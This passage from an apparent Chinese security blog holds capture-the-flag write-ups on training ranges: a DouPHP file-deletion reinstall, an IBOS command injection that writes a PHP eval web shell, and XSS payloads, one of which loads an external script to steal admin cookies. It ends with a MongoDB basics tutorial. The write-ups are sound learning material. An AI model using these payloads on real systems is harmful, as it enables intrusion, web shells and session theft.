<p>然后将filename给删了，然后进行任意文件删除post传参，这是原定的上传路径<strong>\DouPHP_1.5\upload\theme\default\images</strong>，<strong>所以我们想要回到upload至少要../三次，然后删除data/install.lock就可以重新安装了，但是实际上不知道为啥要四次，getshell看看目录长什么样</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813094416257.png" alt="image-20210813094416257"></p>
</blockquote>
<p>直接访问主页面进行重新安装getshell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812162851733.png" alt="image-20210812162851733"></p>
</blockquote>
<p>接着访问data/config.php</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812162922117.png" alt="image-20210812162922117"></p>
</blockquote>
<p>原来是多了个m目录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812163103054.png" alt="image-20210812163103054"></p>
</blockquote>
<p><strong>拿flag</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812163228963.png" alt="image-20210812163228963"></p>
</blockquote>
<h1 id="命令执行漏洞审计"><a href="#命令执行漏洞审计" class="headerlink" title="命令执行漏洞审计"></a>命令执行漏洞审计</h1><blockquote>
<ul>
<li><strong>环境：<a href="http://59.63.200.79:9808/?r=user/default/login" target="_blank" rel="noopener">http://59.63.200.79:9808/?r=user/default/login</a></strong></li>
<li>后台 admin zkaqzkaq</li>
</ul>
</blockquote>
<p>命令执行部分基本几个命令函数</p>
<p><strong>1、system()执行命令输出结果</strong></p>
<p><strong>2、exec()只会得到结果最后一行</strong></p>
<p><strong>3、 passthru()执行命令输出结果</strong></p>
<p><strong>4、shell_exec()只会得到结果的全部</strong></p>
<p>了解了基础知识了，打开靶场看一下 <strong>IBOS 4.5.5 PRO</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812205425782.png" alt="image-20210812205425782"></p>
</blockquote>
<p>下载源码<a href="http://www.ibos.com.cn/download，发现core里面源码都zend加密了，网上查查看是什么加密" target="_blank" rel="noopener">http://www.ibos.com.cn/download，发现core里面源码都zend加密了，网上查查看是什么加密</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812205747041.png" alt="image-20210812205747041"></p>
</blockquote>
<p><strong>zend|53可解密</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812205828289.png" alt="image-20210812205828289"></p>
</blockquote>
<p><strong>直接拿起SeayDzend来进行解密，选准版本</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812205902918.png" alt="image-20210812205902918"></p>
</blockquote>
<p>打开代码审计工具，来找找命令执行直接全局搜索<strong>shell_exec</strong>，发现存在两处可能出现命令执行的位置</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812211405427.png" alt="image-20210812211405427"></p>
</blockquote>
<p><strong>第一个的$file变量由于不可控，所以不考虑，看看第二个追踪一下代码</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell_exec(&quot;&#123;$mysqlBin&#125;mysqldump --force --quick $command1 --add-drop-table $command2 $command3 --host&#x3D;\&quot;&#123;$db[&quot;host&quot;]&#125;\&quot; $command5 --user&#x3D;\&quot;&#123;$db[&quot;username&quot;]&#125;\&quot; --password&#x3D;\&quot;&#123;$db[&quot;password&quot;]&#125;\&quot; \&quot;&#123;$db[&quot;dbname&quot;]&#125;\&quot; $tablesstr &gt; $dumpFile&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里出现了<strong>mysqldump</strong>，这是一个MySQL自带的备份工具。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">命令格式</span><br><span class="line">mysqldump [选项] 数据库名 [表名] &gt; 脚本名</span><br><span class="line"></span><br><span class="line">mysqldump [选项] --数据库名 [选项 表名] &gt; 脚本名</span><br><span class="line"></span><br><span class="line">mysqldump [选项] --all-databases [选项] &gt; 脚本名</span><br></pre></td></tr></table></figure></div>

<p><strong>后台真实存在的数据库功能，本地查看一下确实存在数据库备份</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812212941191.png" alt="image-20210812212941191"></p>
</blockquote>
<p><strong>本地备份一下看看会上传到哪，并且参数是否可控，抓包看</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812213632602.png" alt="image-20210812213632602"></p>
</blockquote>
<p>乱码了，不过确定参数filename是可控的</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812213746157.png" alt="image-20210812213746157"></p>
<p><strong>追踪一下变量$dumpfile看看</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$dumpFile &#x3D; core\utils\addslashes(core\utils\PATH_ROOT) . &quot;&#x2F;&quot; . $backupFileName . &quot;.sql&quot;;</span><br><span class="line"></span><br><span class="line">$backupFileName &#x3D; self::BACKUP_DIR . &quot;&#x2F;&quot; . core\utils\str_replace(array(&quot;&#x2F;&quot;, &quot;\\&quot;, &quot;.&quot;, &quot;&#39;&quot;), &quot;&quot;, $fileName);</span><br><span class="line"></span><br><span class="line">$fileName &#x3D; core\utils\Env::getRequest(&quot;filename&quot;);</span><br></pre></td></tr></table></figure></div>

<p><strong>由于backup名字是由filename决定，所以$dumpFile跟getRequest(“filename”)是有关的</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812214753786.png" alt="image-20210812214753786"></p>
</blockquote>
<p><strong>然后再仔细看看代码，执行shell_exec的情况是else，所以必须让前面一个条件不满足</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			shell_exec(<span class="string">"&#123;$mysqlBin&#125;mysqldump --force --quick $command1 --add-drop-table $command2 $command3 --host=\"&#123;$db["</span>host<span class="string">"]&#125;\" $command5 --user=\"&#123;$db["</span>username<span class="string">"]&#125;\" --password=\"&#123;$db["</span>password<span class="string">"]&#125;\" \"&#123;$db["</span>dbname<span class="string">"]&#125;\" $tablesstr &gt; $dumpFile"</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>发现有一个method和他对应，一样可以通过post传参修改</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">if ($method &#x3D;&#x3D; &quot;multivol&quot;) </span><br><span class="line"></span><br><span class="line">$method &#x3D; core\utils\Env::getRequest(&quot;method&quot;);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813090336208.png" alt="image-20210813090336208"></p>
</blockquote>
<p><strong>将method改成任意值，让这个条件为false就行，我就改成gylq，发现可以利用命令执行创建文件</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813090818355.png" alt="image-20210813090818355"></p>
</blockquote>
<p><strong>试试用;来进行多条命令执行，成功生成执行语句中的123</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813091332069.png" alt="image-20210813091332069"></p>
</blockquote>
<p><strong>这里我们就可以思考开始利用shell_exec()在服务器上生成php文件了。</strong></p>
<p><strong>shell_exec()执行的是系统命令，可以利用管道符进行多条命令执行。</strong></p>
<p><strong>&amp;filename=test1;test2;test3;，会多条命令执行，所以我们写php文件</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813091422983.png" alt="image-20210813091422983"></p>
</blockquote>
<p><strong>这时我们看看源码什么情况，发现所有的/.都被替换成空了，想办法绕过</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$backupFileName &#x3D; self::BACKUP_DIR . &quot;&#x2F;&quot; . core\utils\str_replace(array(&quot;&#x2F;&quot;, &quot;\\&quot;, &quot;.&quot;, &quot;&#39;&quot;), &quot;&quot;, $fileName);</span><br></pre></td></tr></table></figure></div>

<p>这时找到一个办法，利用系统环境变量截取来构造一个.</p>
<p><strong>首先set看看环境变量，可以看到有一个变量存在.</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813091743203.png" alt="image-20210813091743203"></p>
</blockquote>
<p><strong>然后截取第一位</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813091813894.png" alt="image-20210813091813894"></p>
</blockquote>
<p><strong>本地测试一下看看行不行,写一句话木马</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813092126245.png" alt="image-20210813092126245"></p>
</blockquote>
<p><strong>成功能创建出来，拿着payload去试试本地的靶机，最终成功写入</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&amp;filename&#x3D;gylqtesaat;echo &quot;&lt;?php eval($_REQUEST[1]);?&gt;&quot; &gt;&gt; shell%pathext:~0,1%php;123</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813092159320.png" alt="image-20210813092159320"></p>
<p>既然本地靶场都能写入，去看看zk的靶场试试payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&amp;filename&#x3D;gylqtesaat;echo &quot;&lt;?php eval($_REQUEST[1]);?&gt;&quot; &gt;&gt; shell%pathext:~0,1%php;123</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813092728514.png" alt="image-20210813092728514"></p>
</blockquote>
<p>由于是数据库备份，插入的时候会执行insert语句，然后echo控制了输出的文件名，然后就可以getshell了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813093022689.png" alt="image-20210813093022689"></p>
</blockquote>
<p><strong>然后拿蚁剑连接拿flag</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210813093223828.png" alt="image-20210813093223828"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>代码审计</tag>
        <tag>封神台</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】前端渗透 XSS wp</title>
    <url>/posts/92.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场前端渗透/XSS，学习一下！</li>
</ul>
</blockquote>
<h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><blockquote>
<ul>
<li><strong>环境：<a href="http://b-ref-xss-1s.lab.aqlab.cn/" target="_blank" rel="noopener">http://b-ref-xss-1s.lab.aqlab.cn/</a></strong></li>
<li><strong>了解一下</strong></li>
<li><strong>一般证明XSS是否存在，就是在正常页面传参然后构建参数让他弹窗就是存在XSS了</strong><br><strong>XSS一般在什么业务场景容易遇见？</strong><br><strong>重灾区：评论区、留言区、个人信息、订单信息等。</strong><br><strong>针对型：站内信、网页即时通讯、私信、意见反馈。</strong><br><strong>存在风险：搜索框、当前目录、图片属性等。</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>遵循一个原则，见框就X</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805092731188.png" alt="image-20210805092731188"></p>
</blockquote>
<ul>
<li><strong>发现并没有什么反应，审计元素看看代码F12</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805092837982.png" alt="image-20210805092837982"></p>
</blockquote>
<ul>
<li>输入双引号发现被转义了，那就输入<strong>单引号</strong>来闭合</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#39; oninput&#x3D;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805093254599.png" alt="image-20210805093254599"></p>
</blockquote>
<ul>
<li><strong>用\转义，或者用//来注释都行</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#39; oninput&#x3D;alert(&#x2F;xss&#x2F;) \</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805093354847.png" alt="image-20210805093354847"></p>
</blockquote>
<ul>
<li><strong>接着输入一个任意字符就可以拿flag</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805093436060.png" alt="image-20210805093436060"></p>
</blockquote>
<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><blockquote>
<p>环境：<a href="http://59.63.200.79:8082/" target="_blank" rel="noopener">http://59.63.200.79:8082/</a></p>
</blockquote>
<ul>
<li><strong>先打开看看，发现是FineCMS v5.3.0，因为提示是存储型XSS</strong>。百度一下，看看有没有相关的漏洞</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805093636171.png" alt="image-20210805093636171"></p>
</blockquote>
<ul>
<li><strong>百度了一下，发现这个cms邮件处url有xss漏洞</strong></li>
</ul>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8082&#x2F;index.php?c&#x3D;mail&amp;m&#x3D;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805094003613.png" alt="image-20210805094003613"></p>
</blockquote>
<ul>
<li>因为这个邮件是直接发给管理员，根据说明，所以我们得想办法窃取管理员cookie进入后台。</li>
</ul>
<p>先找一个<a href="https://gylq.github.io/gylq-navigation/" target="_blank" rel="noopener">xss平台导航</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805100643223.png" alt="image-20210805100643223"></p>
</blockquote>
<ul>
<li><strong>注册一个账号，然后进去创建一个新项目</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805100727610.png" alt="image-20210805100727610"></p>
</blockquote>
<ul>
<li>我们只是获取cookie，就选<strong>超强默认模块</strong>和<strong>基础默认模块</strong>，有兴趣可以看看他们说明</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805100830687.png" alt="image-20210805100830687"></p>
</blockquote>
<ul>
<li><strong>就用最短代码吧</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805100905290.png" alt="image-20210805100905290"></p>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8082&#x2F;index.php?c&#x3D;mail&amp;m&#x3D;极限最短代码</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805100954668.png" alt="image-20210805100954668"></p>
</blockquote>
<ul>
<li><strong>刷新一下项目页面就收到了cookie了，因为有robot自动访问后台</strong>,得到flag了。</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805101110064.png" alt="image-20210805101110064"></p>
</blockquote>
<ul>
<li><strong>根据cms源码可以知道管理员路径是admin.php，我们尝试用cookie登陆下后台</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">member_cookie&#x3D;d256812b83f3751716e6</span><br><span class="line">member_uid&#x3D;1</span><br></pre></td></tr></table></figure></div>

<p><strong>将这个两个cookie值加入</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805102514228.png" alt="image-20210805102514228"></p>
</blockquote>
<ul>
<li>接着我们再访问管理员页面</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8082&#x2F;admin.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805102545578.png" alt="image-20210805102545578"></p>
</blockquote>
<ul>
<li><strong>然后就是基本操作，添加一个管理员账户，以后就不用cookie了</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805102705599.png" alt="image-20210805102705599"></p>
</blockquote>
<h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><blockquote>
<ul>
<li>环境：<a href="http://59.63.200.79:8014/dom_xss/" target="_blank" rel="noopener">http://59.63.200.79:8014/dom_xss/</a></li>
<li><strong>注意：被waf拦截就将cookie清空</strong></li>
</ul>
</blockquote>
<p><strong>了解一些基础知识</strong></p>
<p>DOM XSS注入核心代码document,程序和脚本可以通过dom接口来修改前端网页</p>
<ol>
<li>document.cookie 读取网页cookie，可设置cookie</li>
<li>document.domain 返回当前IP</li>
<li>document.lastModified 获得页面最后修改时间</li>
<li><strong>document.write</strong> 向文档中写入HTML或JS代码</li>
</ol>
<ul>
<li>一打开靶场，检查了下元素，就看到<strong>document.write</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805103724506.png" alt="image-20210805103724506"></p>
</blockquote>
<ul>
<li><strong>试了下，这个write截取浏览器后面输入的所有字符串向文档写入然后当做代码执行，因为我们访问浏览器的时候，是生成了文档页面的所以，这个dom型就是向文档中写入代码，然后被页面执行</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805103901000.png" alt="image-20210805103901000"></p>
</blockquote>
<ul>
<li><strong>尝试一下恶意代码，估计过滤了script被waf拦截了</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805103936688.png" alt="image-20210805103936688"></p>
</blockquote>
<ul>
<li>所以有两种做法，第一种是绕过waf，因为这个waf太老了，绕了也没啥意义但是还是给个payload</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8014&#x2F;dom_xss&#x2F;index.php&#x2F;.txt?id&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(&#x2F;dom-xss&#x2F;)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805104907949.png" alt="image-20210805104907949"></p>
</blockquote>
<ul>
<li><strong>因为DOM型XSS也是只能在该页面插入html代码，所以这个也是反射型的一种，我们用另一种方法，因为js能解码native编码</strong></li>
</ul>
<p>直接去<a href="https://gylq.github.io/gylq-navigation/" target="_blank" rel="noopener">导航</a>站长工具</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805105557481.png" alt="image-20210805105557481"></p>
</blockquote>
<ul>
<li><strong>找到native编码互转</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805105624726.png" alt="image-20210805105624726"></p>
<ul>
<li>可以直接绕过</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805105655587.png" alt="image-20210805105655587"></p>
</blockquote>
<ul>
<li><strong>这样就会出现一个问题，反射型和dom型XSS怎么利用？一样的构造一个url让其他人点一样可以获取cookie，将我们的极限短xss代码转换为native形式</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805110006489.png" alt="image-20210805110006489"></p>
<ul>
<li><strong>测试一下是否有用，访问了一下，明显拿到我自己电脑的cookie和信息了</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8014&#x2F;dom_xss&#x2F;?id&#x3D;\u003c\u0073\u0043\u0052\u0069\u0050\u0074\u002f\u0053\u0072\u0043\u003d\u002f\u002f\u0078\u0073\u002e\u0073\u0062\u002f\u006f\u0050\u0036\u0078\u003e</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805110120932.png" alt="image-20210805110120932"></p>
</blockquote>
<ul>
<li><strong>所以我们想要利用个反射型的xss得先打开建议和投诉页面<a href="http://59.63.200.79:8014/dom_xss/dom.html，然后将我们构造的恶意代码发给客服机器人，访问我们就可以获取管理员cookie" target="_blank" rel="noopener">http://59.63.200.79:8014/dom_xss/dom.html，然后将我们构造的恶意代码发给客服机器人，访问我们就可以获取管理员cookie</a></strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805110334088.png" alt="image-20210805110334088"></p>
<ul>
<li><strong>刷新一下我们的xss项目平台，获取到了cookie</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210805110425417.png" alt="image-20210805110425417"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>【MongoDB】基本命令使用</title>
    <url>/posts/89.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li><strong>对于MongoDB学习注入之前，先进行一些知识储备</strong></li>
<li>环境-ubuntu18.04 </li>
</ul>
</blockquote>
<h1 id="基本启动操作"><a href="#基本启动操作" class="headerlink" title="基本启动操作"></a>基本启动操作</h1><p><strong>MongoDB的服务启动</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">service mongodb start #启动服务</span><br><span class="line">service mongodb status #确定服务是running中</span><br></pre></td></tr></table></figure></div>

<p><strong>查询MongoDB的端口</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netstat -tulnp|grep mongo #一般27017</span><br><span class="line">关闭MongoDB可以直接kill ps auxw里面杀死pid进程</span><br></pre></td></tr></table></figure></div>

<p><strong>打开MongoDB的客户端</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name mongo -print #找到客户端的位置</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mongo 127.0.0.1:27017 #直接进入和mysql一样登陆一样</span><br></pre></td></tr></table></figure></div>

<p><strong>基本命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">show dbs; #数据库</span><br><span class="line">user admin; #使用x数据库</span><br><span class="line">show tables; #显示当前表</span><br><span class="line">db.myuser.find(); #显示myuser表中所有数据</span><br></pre></td></tr></table></figure></div>

<p><strong>实际情况</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&gt; show dbs;</span><br><span class="line">admin      0.000GB</span><br><span class="line">config     0.000GB</span><br><span class="line">local      0.000GB</span><br><span class="line">shijiange  0.000GB</span><br><span class="line">&gt; use shijiange</span><br><span class="line">switched to db shijiange</span><br><span class="line">&gt; show tables;</span><br><span class="line">myuser</span><br><span class="line">&gt; db.myuser.find()</span><br><span class="line">&#123; "_id" : ObjectId("6109e55db3da451c7b659eb3"), "name" : "shijiange1", "age" : 20 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e562b3da451c7b659eb4"), "name" : "shijiange2", "age" : 30 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e567b3da451c7b659eb5"), "name" : "shijiange3", "age" : 40 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e56cb3da451c7b659eb6"), "name" : "shijiange4", "age" : 50 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e57cb3da451c7b659eb7"), "name" : "zhangsan4", "age" : 50 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e580b3da451c7b659eb8"), "name" : "zhangsan3", "age" : 50 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e58ab3da451c7b659eb9"), "name" : "zhangsan2", "age" : 40 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("6109e58fb3da451c7b659eba"), "name" : "zhangsan1", "age" : 20 &#125;</span><br></pre></td></tr></table></figure>

<h1 id="MongoDB集合的多种查询方式"><a href="#MongoDB集合的多种查询方式" class="headerlink" title="MongoDB集合的多种查询方式"></a>MongoDB集合的多种查询方式</h1><p><strong>pretty易读的方式</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt;db.myuser.find().pretty()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;),</span><br><span class="line">	&quot;name&quot; : &quot;shijiange1&quot;,</span><br><span class="line">	&quot;age&quot; : 20</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">	&quot;_id&quot; : ObjectId(&quot;6109e562b3da451c7b659eb4&quot;),</span><br><span class="line">	&quot;name&quot; : &quot;shijiange2&quot;,</span><br><span class="line">	&quot;age&quot; : 30</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">	&quot;_id&quot; : ObjectId(&quot;6109e567b3da451c7b659eb5&quot;),</span><br><span class="line">	&quot;name&quot; : &quot;shijiange3&quot;,</span><br><span class="line">	&quot;age&quot; : 40</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>和mysql一样的limit查询，可以利用skip来分页查询</strong></p>
